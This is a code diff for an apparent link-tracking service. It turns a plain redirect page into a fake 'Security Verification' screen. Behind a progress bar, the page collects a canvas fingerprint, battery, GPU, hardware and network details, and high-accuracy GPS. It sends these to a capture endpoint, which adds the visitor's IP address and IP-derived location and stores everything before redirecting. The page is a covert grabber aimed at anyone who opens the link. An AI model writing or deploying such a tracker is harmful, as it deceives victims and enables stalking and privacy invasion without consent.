@@ -47,7 +47,7 @@ app.get('/t/:id', async (c) => {
   const id = c.req.param('id')
   const env = c.env
   const admin = getAdmin(env)
-  const db = admin.firestore()
+    const db = admin.firestore()
 
   try {
     const docRef = db.collection('trackingLinks').doc(id)
@@ -64,57 +64,168 @@ app.get('/t/:id', async (c) => {
       lastClickAt: new Date().toISOString()
     })
 
-    // HTML to capture browser details then redirect
+    // HTML to capture full device intelligence then redirect
     return c.html(`
       <!DOCTYPE html>
       <html>
       <head>
         <meta charset="UTF-8">
-        <title>Redirecting...</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Security Verification</title>
+        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Bebas+Neue&display=swap" rel="stylesheet">
+        <style>
+          body { background: #050505; color: #fff; font-family: 'JetBrains Mono', monospace; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+          .loader-container { text-align: center; position: relative; }
+          .glitch-text { font-family: 'Bebas Neue', cursive; font-size: 32px; letter-spacing: 4px; color: #00d4ff; text-shadow: 0 0 20px rgba(0,212,255,0.4); animation: pulse 1.5s infinite; }
+          .sub-text { font-size: 10px; color: #555; text-transform: uppercase; margin-top: 15px; letter-spacing: 2px; }
+          .progress-bar { width: 200px; height: 2px; background: rgba(255,255,255,0.05); margin: 20px auto; position: relative; overflow: hidden; border-radius: 4px; }
+          .progress-fill { position: absolute; top: 0; left: 0; height: 100%; width: 0%; background: #00d4ff; box-shadow: 0 0 10px #00d4ff; transition: width 0.2s; }
+          @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
+        </style>
         <script>
-          async function pushCapture() {
+          async function getFingerprint() {
             try {
+              const canvas = document.createElement('canvas');
+              const ctx = canvas.getContext('2d');
+              ctx.textBaseline = "top";
+              ctx.font = "14px 'Arial'";
+              ctx.textBaseline = "alphabetic";
+              ctx.fillStyle = "#f60";
+              ctx.fillRect(125,1,62,20);
+              ctx.fillStyle = "#069";
+              ctx.fillText("TraxelonV1", 2, 15);
+              ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+              ctx.fillText("TraxelonV1", 4, 17);
+              return btoa(canvas.toDataURL()).slice(-50);
+            } catch(e) { return 'unsupported'; }
+          }
+
+          async function getBattery() {
+            try {
+              if (!navigator.getBattery) return null;
+              const b = await navigator.getBattery();
+              return { level: b.level * 100, charging: b.charging, chargingTime: b.chargingTime, dischargingTime: b.dischargingTime };
+            } catch(e) { return null; }
+          }
+
+          function getGPU() {
+            try {
+              const canvas = document.createElement('canvas');
+              const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+              if (!gl) return null;
+              const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+              return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown';
+            } catch(e) { return 'Unknown'; }
+          }
+
+          async function collect() {
+            const bar = document.querySelector('.progress-fill');
+            const status = document.querySelector('.sub-text');
+            
+            try {
+              bar.style.width = '20%'; 
+              status.innerText = "INITIALIZING CORE...";
+              
+              const fingerprint = await getFingerprint();
+              bar.style.width = '30%';
+              status.innerText = "ANALYZING HARDWARE...";
+
+              const battery = await getBattery();
+              const gpu = getGPU();
+              
+              bar.style.width = '50%';
+              status.innerText = "MAPPING NETWORK...";
+
               const info = {
                 capturedAt: new Date().toISOString(),
                 userAgent: navigator.userAgent,
                 language: navigator.language,
-                screenWidth: window.screen.width,
-                screenHeight: window.screen.height,
+                screen: {
+                  width: window.screen.width,
+                  height: window.screen.height,
+                  colorDepth: window.screen.colorDepth,
+                  pixelDepth: window.screen.pixelDepth,
+                  dpr: window.devicePixelRatio
+                },
+                hardware: {
+                  cpuCores: navigator.hardwareConcurrency || 'Unknown',
+                  ram: navigator.deviceMemory || 'Unknown',
+                  gpu: gpu,
+                  platform: navigator.platform,
+                  vendor: navigator.vendor,
+                  maxTouchPoints: navigator.maxTouchPoints
+                },
+                battery: battery,
+                network: navigator.connection ? {
+                  effectiveType: navigator.connection.effectiveType,
+                  rtt: navigator.connection.rtt,
+                  downlink: navigator.connection.downlink,
+                  saveData: navigator.connection.saveData
+                } : null,
+                fingerprint: fingerprint,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                platform: navigator.platform,
-                vendor: navigator.vendor,
-                hardwareConcurrency: navigator.hardwareConcurrency || null,
-                deviceMemory: navigator.deviceMemory || null,
                 onLine: navigator.onLine,
+                referrer: document.referrer || 'Direct'
               };
-              
+
+              // GPS Attempt
+              try {
+                if (navigator.geolocation) {
+                  status.innerText = "REQUESTING GPS HANDSHAKE...";
+                  const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, { 
+                      enableHighAccuracy: true, timeout: 5000, maximumAge: 0 
+                    });
+                  });
+                  info.gps = {
+                    lat: pos.coords.latitude,
+                    lon: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy,
+                    altitude: pos.coords.altitude,
+                    heading: pos.coords.heading,
+                    speed: pos.coords.speed
+                  };
+                }
+              } catch (e) {
+                console.warn('GPS Denied or Timeout');
+              }
+
+              bar.style.width = '70%';
+              status.innerText = "CHECKING SECURITY...";
+
               // Adblock detection
               try {
-                const url = 'https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js';
-                const res = await fetch(url, { method: 'HEAD', mode: 'no-cors' });
+                const res = await fetch('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js', { method: 'HEAD', mode: 'no-cors' });
                 info.adBlockEnabled = false;
-              } catch (e) {
-                info.adBlockEnabled = true;
-              }
-              
+              } catch (e) { info.adBlockEnabled = true; }
+
+              bar.style.width = '90%';
+              status.innerText = "FINALIZING CAPTURE...";
+
               await fetch('/api/capture/${id}', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(info)
               });
+              
+              bar.style.width = '100%';
+              status.innerText = "REDIRECTING...";
             } catch (e) {
-              console.error('Capture failed', e);
+              console.error(e);
             } finally {
-              window.location.href = "${destination}";
+              setTimeout(() => {
+                window.location.href = "${destination}";
+              }, 400);
             }
           }
-          window.onload = pushCapture;
+          window.onload = collect;
         </script>
       </head>
-      <body style="background:#0a0a0c;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;margin:0;">
-        <div style="text-align:center;">
-          <div style="font-size:12px;color:#555;margin-bottom:12px;letter-spacing:1px;text-transform:uppercase;">Security Verification</div>
-          <div style="font-size:18px;font-weight:500;">Please wait while we redirect you...</div>
+      <body>
+        <div class="loader-container">
+          <div class="glitch-text">ANALYZING DEVICE</div>
+          <div class="progress-bar"><div class="progress-fill"></div></div>
+          <div class="sub-text">Security Handshake in Progress...</div>
         </div>
       </body>
       </html>
@@ -125,7 +236,6 @@ app.get('/t/:id', async (c) => {
 })
 
 // ── Capture Data Endpoint ───────────────────────────────────────────────────
-// Public route - no auth required (called by redirect page)
 app.post('/api/capture/:id', async (c) => {
   const id = c.req.param('id')
   const clientData = await c.req.json()
@@ -146,7 +256,7 @@ app.post('/api/capture/:id', async (c) => {
     const ip = c.req.header('cf-connecting-ip') || c.req.header('x-forwarded-for')?.split(',')[0].trim() || '0.0.0.0'
     const ua = c.req.header('user-agent') || ''
 
-    // Helper to identify Browser/OS from UA if not sent by client
+    // Helper to identify Browser/OS from UA
     const getBrowser = (u) => {
       if (u.includes('Firefox')) return 'Firefox'
       if (u.includes('Chrome')) return 'Chrome'
@@ -163,22 +273,27 @@ app.post('/api/capture/:id', async (c) => {
       return 'Unknown'
     }
 
+    // Modern structure for storing everything
     const newCapture = {
-      ...clientData, // Preserve all 40+ attributes sent by frontend
-      ip: ip || clientData.ip || '0.0.0.0',
-      city: clientData.city || cf.city || 'Unknown',
-      country: clientData.countryCode || clientData.country || cf.country || 'Unknown',
-      isp: clientData.isp || clientData.org || clientData.asn || cf.asOrganization || 'Unknown',
-      browser: clientData.browser || getBrowser(ua),
-      os: clientData.os || getOS(ua),
-      device: clientData.device || (clientData.screenWidth < 768 ? 'Mobile' : 'Desktop'),
+      ...clientData, 
+      ip: ip,
+      city: cf.city || 'Unknown',
+      region: cf.region || 'Unknown',
+      country: cf.country || 'Unknown',
+      isp: cf.asOrganization || 'Unknown',
+      lat: cf.latitude || null,
+      lon: cf.longitude || null,
+      browser: getBrowser(ua),
+      os: getOS(ua),
+      device: clientData.hardware?.platform?.includes('iPhone') || clientData.hardware?.platform?.includes('Android') ? 'Mobile' : 'Desktop',
       capturedAt: clientData.capturedAt || new Date().toISOString()
     }
 
     // Update doc with new capture
     await docRef.update({
       captures: [...captures, newCapture],
-      captureCount: (parseInt(data.captureCount, 10) || 0) + 1
+      captureCount: (parseInt(data.captureCount, 10) || 0) + 1,
+      lastCaptureAt: newCapture.capturedAt
     })
 
     return c.json({ success: true })
